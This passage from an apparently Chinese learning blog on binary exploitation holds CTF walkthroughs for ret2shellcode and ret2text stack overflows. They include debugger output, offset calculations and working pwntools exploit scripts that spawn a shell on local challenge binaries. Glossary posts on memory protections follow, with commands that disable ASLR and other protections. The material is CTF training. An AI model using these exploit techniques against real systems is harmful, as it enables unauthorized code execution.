class="line">02:0008│      0xffffd278 —▸ 0xffffd298 —▸ 0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line">03:000c│      0xffffd27c —▸ 0xf7ffde14 —▸ 0xf7ffdda0 —▸ 0xf7ffdc54 —▸ 0xf7ffdc40 ◂— ...</span><br><span class="line">04:0010│      0xffffd280 —▸ 0xffffd2d0 ◂— 0x1</span><br><span class="line">05:0014│      0xffffd284 ◂— 0x0</span><br><span class="line">06:0018│      0xffffd288 —▸ 0xf7ffd000 ◂— and    al, 0x8f /* 0x28f24 */</span><br><span class="line">07:001c│      0xffffd28c ◂— 0x0</span><br><span class="line">────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► f 0  8048536 main+9</span><br><span class="line">   f 1 f7df2ef1 __libc_start_main+241</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/kali/PWN/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/kali/PWN/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/kali/PWN/ret2shellcode</span><br><span class="line">0xf7dd4000 0xf7fb2000 r-xp   1de000 0      /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb2000 0xf7fb4000 r-xp     2000 1dd000 /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb4000 0xf7fb6000 rwxp     2000 1df000 /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 rwxp     2000 0      </span><br><span class="line">0xf7fce000 0xf7fd0000 rwxp     2000 0      </span><br><span class="line">0xf7fd0000 0xf7fd3000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd3000 0xf7fd4000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd4000 0xf7ffc000 r-xp    28000 0      /usr/lib32/ld-2.30.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 27000  /usr/lib32/ld-2.30.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 28000  /usr/lib32/ld-2.30.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure>

<p>在main函数处下断点，通过vmmap<code>#查看进程中的权限</code>。</p>
<p>buf2地址为0x0804A080，落在</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/kali/PWN/ret2shellcode</span><br></pre></td></tr></table></figure>

<p>中，所以可以看到bss段具有可执行的权限</p>
<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。需要额外注意的是最后payload的组成应该是<code>payload = shellcode + 垃圾填充字符 + 要跳转地址（这里是bss段shellcode的地址）</code>。这里的buf2地址为0x0804A080，所以的返回地址（retaddr）就是是0x0804A080。</p>
<p>编写相应的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>代码中<code>asm(shellcraft.sh())</code>是生成一个shellcode，<code>shellcode.ljust(112, b&#39;A&#39;)</code>是若生成的shellcode长度若不够112个，则用垃圾字符填充。</p>
<p>执行代码成功获取shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ python3 ret2shellcode.py </span><br><span class="line">[+] Starting local process './ret2shellcode': pid 1901</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">No system for you this time !!!</span><br><span class="line">bye bye ~$ ls</span><br><span class="line">pwndbg    ret2shellcode  ret2shellcode.py  ret2text  ret2text.py</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/31/%E4%BB%8Eret2text%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/31/%E4%BB%8Eret2text%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2text入坑栈溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-05-31 10:10:06 / Modified: 21:29:20" itemprop="dateCreated datePublished" datetime="2020-05-31T10:10:06+08:00">2020-05-31</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ret2text入坑学习，这里使用看雪题库的一道PWN题进行学习记录：<a href="https://ctf.pediy.com/itembank.htm" target="_blank" rel="noopener">一鸣惊人</a></p>
<h4 id="ret2text原理"><a href="#ret2text原理" class="headerlink" title="ret2text原理"></a>ret2text原理</h4><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h4 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h4><p>先讲一下栈的基本概念，简单说栈就是用于保存函数调用信息和局部变量的一段内存空间。</p>
<p>这里再引入函数调用栈的内容，先来看一张图。</p>
<img src="/images/从ret2text入坑栈溢出/函数调用栈.jpg" alt="函数调用栈" style="zoom:60%;" />

<p>从图中可以看到我们进入到函数后的可以控制的变量所在位置是在“当前栈帧”的“局部变量中”，当我们需要造成栈溢出执行ret2text的时候需要将“返回地址”进行覆盖，所以我们要做的是填满局部变量+覆盖保存的ebp（saved ebp）+覆盖返回地址（retaddr）为我们想要执行的地址。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>看一下看雪的一道PWN题来具体分析，题目在<a href="https://ctf.pediy.com/itembank.htm" target="_blank" rel="noopener">一鸣惊人</a>，可自行查看详情。</p>
<p>首先使用<a href="https://github.com/slimm609/checksec.sh">checksec.sh</a>查看一下程序的保护机制，pwntools的checksec和checksec.sh有些许不同，不用过多在意。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ymjr</span><br><span class="line">[*] '/home/kali/PWN/ymjr'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>



<p>可以看出程序是32位程序，仅开启了栈不可执行保护，然后通过IDA来看出源代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看主函数存在gets函数，明显可以看到存在栈溢出漏洞。</p>
<p>在secure函数里发现存在调用<code>system(&quot;/bin/sh&quot;)</code>的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看system函数的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>



<p>那么要PWN这个程序的思路就是通过gets函数输入s的值去覆盖retaddres以执行<code>system(&quot;/bin/sh&quot;)</code>代码获取shell，即返回地址要覆盖为0x0804863A。</p>
<p>s存在的是我们输入的数据，要在这里溢出，就需要确定填充长度，主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。</p>
<p>查看IDA的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br></pre></td></tr></table></figure>

<p>s变量在内存中的位置距离栈顶+1Ch个字节，距离栈底-64h个字节。这里不能使用<code>[ebp-64h]</code>来进行偏移的计算，因为查看汇编代码可知s是相对于esp的索引，所以s变量的偏移量相对于esp是正确的，而相对于ebp的偏移量是错误的，这就需要通过动态调试来获取偏移量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>

<p>通过gdb进行调试，在call的位置下断点。这里在介绍下常用的几种下断点的方式</p>
<ul>
<li>数据断点：根据地址来设置断点，只能是在debug程序运行之后设置，如<code>b *0x400522</code>而获取地址值的方法是，先设置普通断点，在断点处<code>print &amp;变量名</code> 就能获取该变量的地址，如<code>b &amp;变量名</code>。</li>
<li>函数断点：当程序执行到某个程序时就会触发断点，如<code>b &amp;变量名</code>。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24      gets(buf);</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line"><span class="meta">$</span><span class="bash">eax   : 0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebx   : 0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ecx   : 0xffffffff</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edx   : 0xf7faf870  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebp   : 0xffffcdc8  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esi   : 0xf7fae000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edi   : 0xf7fae000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到esp为0xffffcd40，ebp为0xffffcdc8，已知s相对于esp的索引为<code>[esp+1Ch]</code>，那么s的地址为<code>[esp+1Ch]=0xffffcd5c</code>。所以s相对于ebp的偏移量为<code>[s-ebp]=0x6c</code>，因为还有saved ebp的存在，所以s相对于返回（ret）地址的偏移为<code>[0x6c+4]=0x70</code>，+4是因为一个单位栈空间占据4字节。</p>
<p>使用pwntools库编写exp程序，使用python3时，在payload一行注意填充字符时使用<code>b&#39;&#39;</code>填入bytes数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ymjr'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">112</span> + p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>代码中<code>process(&#39;./ymjr&#39;)</code>是设置需要PWN的对象程序，<code>sh.sendline(payload)</code>发送对应的payload，<code>sh.interactive()</code>是获取交互shell。</p>
<p>执行exp程序可成功获取shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ python3 ret2text.py </span><br><span class="line">[+] Starting local process './ymjr': pid 8477</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line">Maybe I will tell you next time !$ ls</span><br><span class="line">core  pwndbg  ret2text.py  ymjr</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/30/PWN%E5%B8%B8%E8%A7%81%E6%9C%AF%E8%AF%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/30/PWN%E5%B8%B8%E8%A7%81%E6%9C%AF%E8%AF%AD/" class="post-title-link" itemprop="url">PWN常见术语</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-30 20:44:47" itemprop="dateCreated datePublished" datetime="2020-05-30T20:44:47+08:00">2020-05-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-05-31 09:28:29" itemprop="dateModified" datetime="2020-05-31T09:28:29+08:00">2020-05-31</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始入坑PWN的学习，本文记录PWN中常见术语，见到一个学习记录一个，保持长期更新。</p>
<h4 id="GOT和PLT"><a href="#GOT和PLT" class="headerlink" title="GOT和PLT"></a>GOT和PLT</h4><ul>
<li><p>PLT : 程序链接表（PLT，Procedure Link Table）</p>
</li>
<li><p>GOT : 重局偏移表（GOT, Global Offset Table）</p>
</li>
</ul>
<p>这缘起于动态链接，动态链接需要考虑的各种因素：</p>
<ul>
<li><p>需要存放外部函数的数据段 —— PLT</p>
</li>
<li><p>获取数据段存放函数地址的一小段额外代码 —— GOT</p>
</li>
</ul>
<p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
<p>存放函数地址的数据表，称为全局偏移表（GOT, Global Offset Table），而那个额外代码段表，称为程序链接表（PLT，Procedure Link Table）。</p>
<h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>Relocation Read-Only（RELRO）此项技术主要针对GOT改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。</p>
<p>Partial RELRO 易受到攻击，例如攻击者可以<strong>atoi.got为system.plt，进而输入/bin/sh\x00获得shell</strong><br>Full RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello test.c // 默认情况下，是Partial RELRO</span><br><span class="line">gcc -z norelro -o hello test.c // 关闭，即No RELRO</span><br><span class="line">gcc -z lazy -o hello test.c // 部分开启，即Partial RELRO</span><br><span class="line">gcc -z now -o hello test.c // 全部开启，即Full RELRO</span><br></pre></td></tr></table></figure>

<h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入类似cookie的信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o hello test.c   //禁用栈保护</span><br><span class="line">gcc -fstack-protector -o hello test.c    //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o hello test.c  //启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o  hello test.c // 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o  hello test.c // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o  hello test.c // 开启NX保护</span><br></pre></td></tr></table></figure>

<h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>Return Oriented Programming，面向return的编程，核心是系统调用，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
<p>ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<h4 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h4><p>以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PIE(Position-Independent Executable, 位置无关可执行文件)技术与 ASLR 技术类似,ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着, 在 PIE 和 ASLR 同时开启的情况下, 攻击者将对程序的内存布局一无所知, 传统的改写<br> GOT 表项的方法也难以进行, 因为攻击者不能获得程序的.got 段的虚地址。<br> 若开启一般需在攻击时泄露地址信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello test.c  // 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o hello test.c  // 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o hello test.c  // 开启PIE，此时为最高强度2</span><br><span class="line">(还与运行时系统ALSR设置有关）</span><br></pre></td></tr></table></figure>

<h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p>
<p>ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责。但是只有在开启 ASLR 之后，PIE 才会生效。</p>
<p>ASLR 的等级可以通过一个内核参数 <strong>randomize_va_space</strong> 来进行控制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space  // 查看ASLR等级</span><br><span class="line">sudo bash -c <span class="string">"echo 0 &gt; /proc/sys/kernel/randomize_va_space"</span>  // 关闭ASLR</span><br><span class="line">sudo bash -c <span class="string">"echo 1 &gt; /proc/sys/kernel/randomize_va_space"</span>  // 普通的ASLR</span><br><span class="line">sudo bash -c <span class="string">"echo 2 &gt; /proc/sys/kernel/randomize_va_space"</span>  // 增强的ASLR</span><br></pre></td></tr></table></figure>

<h4 id="RPATH-RUNPATH"><a href="#RPATH-RUNPATH" class="headerlink" title="RPATH/RUNPATH"></a>RPATH/RUNPATH</h4><p>程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。</p>
<h4 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h4><p>这是一个由GCC实现的源码级别的保护机制，其功能是在编译的时候检查源码以避免潜在的缓冲区溢出等错误。<br>加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk,__printf_chk等。<br>这些带了chk的函数会检查读取/复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，<br>避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。<br>开启了FORTIFY保护的程序会被checksec检出，此外，在反汇编时直接查看got表也会发现chk函数的存在<br>这种检查是默认不开启的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -D_FORTIFY_SOURCE=2 -O1  // 开启fortity检查，开启后会替换strcpy等危险函数。</span><br></pre></td></tr></table></figure>

<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text即执行程序中已有代码，例如程序中写有system等系统的调用函数，我们就可以利用控制已有的gadgets（以ret结尾的指令序列，通过这些指令序列，可以修改某些地址的内容）控制system函数。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/30/PWN%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/30/PWN%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">PWN常用工具</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-05-30 20:02:57" itemprop="dateCreated datePublished" datetime="2020-05-30T20:02:57+08:00">2020-05-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-06-11 21:01:50" itemprop="dateModified" datetime="2020-06-11T21:01:50+08:00">2020-06-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始入坑PWN的学习，本文记录PWN中所使用到的一些工具和软件，保持长期更新。</p>
<h4 id="IDA-PRO"><a href="#IDA-PRO" class="headerlink" title="IDA PRO"></a><a href="">IDA PRO</a></h4><p>交互式反汇编器专业版（Interactive Disassembler Professional），人们常称其为IDA Pro，或简称为IDA。是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器。</p>
<h4 id="x64dbg"><a href="#x64dbg" class="headerlink" title=" x64dbg"></a><a href="https://github.com/x64dbg/x64dbg"> x64dbg</a></h4><p>Windows的开源二进制调试器，旨在对您没有源代码的可执行文件进行恶意软件分析和反向工程。有许多可用功能，还有一个全面的<a href="http://plugins.x64dbg.com/" target="_blank" rel="noopener">插件系统</a>可添加您自己的<a href="http://plugins.x64dbg.com/" target="_blank" rel="noopener">插件</a>。</p>
<h4 id="checksec-sh"><a href="#checksec-sh" class="headerlink" title="checksec.sh"></a><a href="https://github.com/slimm609/checksec.sh">checksec.sh</a></h4><p>Checksec是一个bash脚本，用于检查可执行文件的属性（例如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）。它最初是由Tobias Klein编写的，其原始资源可以在这里找到：<a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">http</a> : <a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">//www.trapkit.de/tools/checksec.html</a></p>
